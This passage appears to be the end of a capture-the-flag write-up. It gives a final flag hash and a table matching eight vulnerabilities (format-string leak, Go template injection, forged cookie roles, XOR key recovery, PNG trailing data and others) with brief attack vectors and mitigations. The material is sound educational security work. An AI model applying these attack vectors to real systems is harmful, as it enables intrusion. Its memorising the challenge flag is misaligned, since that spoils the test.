2. The endpoint outputs the final grand victory flag confirming completion of all 19 stages.

- **Flag Hash**: `1092215aa18b22427d22330312ad055e5bc0398a95d797cab560e24fd4aabf7b`

---

# 🎓 Educational Synthesis

| Vulnerability / Concept | Attack Vector | Underlying Root Cause | Defensive Mitigation |
|---|---|---|---|
| **Trailing PNG Data** | Appending payload after `IEND` chunk | PNG decoders ignore data following `IEND` | Validate EOF offset against `IEND` length; strip metadata. |
| **FFT Frequency Steganography** | Embedding bits into DCT/FFT mid-frequencies | Mid-band frequency perturbations resist quantization | Sanitize and re-encode user-uploaded images. |
| **Known-Plaintext XOR** | $K = C \oplus P$ | Repeating-key stream cipher reuse without nonce | Use authenticated encryption (e.g. AES-256-GCM, ChaCha20-Poly1305). |
| **Insecure Cookie State** | Base64 `username:role` manipulation | Client-side trust without cryptographic signature | Sign sessions with HMAC-SHA256 or use secure server-side sessions. |
| **Go Template SSTI** | Non-recursive `strings.ReplaceAll` | Single-pass blacklists allow nested payloads | Contextual auto-escaping; pass structured view models, never raw templates. |
| **Format String Leak** | `printf(api_token)` | User input supplied as format specifier | Always specify format string constant: `printf("%s", api_token);`. |
| **Out-of-Bounds Memory Write** | `map[player_x][player_y] = 'P'` | Missing bounds checks on array indices | Enforce strict boundary validation: `assert(0 <= x && x < MAX_X)`. |
| **Chosen-Plaintext Oracle** | Encrypting `AAAA` leaks Vigenère key | Linear algebraic shifts reveal key directly | Use modern asymmetric/symmetric primitives with semantic security (IND-CPA). |

---

*Compiled by the IEEE CTF Technical & Infrastructure Committee.*  
*Congratulations to all participants for completing the trial!*
